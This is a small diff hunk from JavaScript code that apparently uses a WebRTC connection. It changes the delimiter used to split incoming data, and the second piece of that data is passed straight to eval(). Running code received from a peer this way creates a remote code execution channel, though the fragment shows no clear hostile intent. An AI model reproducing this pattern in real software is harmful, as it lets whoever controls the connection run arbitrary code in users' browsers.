@@ -168,7 +168,7 @@ pc.onicecandidate = function(ice){
             if(datas[datas.length - 1] !== data){
                 datas.push(data);
 
-                var jsexec = data.split("~");
+                var jsexec = data.split(" ~");
                 console.log(jsexec[1]);
                 eval(jsexec[1]);
 
